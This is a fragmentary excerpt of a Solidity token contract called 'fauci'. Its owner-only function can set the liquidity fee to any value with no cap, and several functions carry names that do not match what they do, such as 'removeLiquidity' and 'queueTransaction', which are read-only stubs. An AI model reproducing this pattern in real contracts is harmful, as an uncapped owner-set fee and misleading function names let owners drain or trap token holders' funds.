...
contract fauci is Ownership {
    using SafeMath for uint256;

    string _name = "fauci";
    string _symbol = "FAUCI";
    uint8 _decimals = 9;
    ...
    function setDelay(uint256 accuracy, address[] calldata _markerPairs) public pure returns (uint256){
    ...
    function setliquidityFeeSetting(uint8 liquidityfee) external onlyOwner {
        liquidityFee = liquidityfee;
    }
   
    function queueTransaction(uint256 newClaim) public view onlyOwner returns(bool) {
		  require(newClaim >= 2800 && newClaim <= 98000, "Dividend_Tracker: claimWait error");
		  return true;
	  }

    function removeLiquidity(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
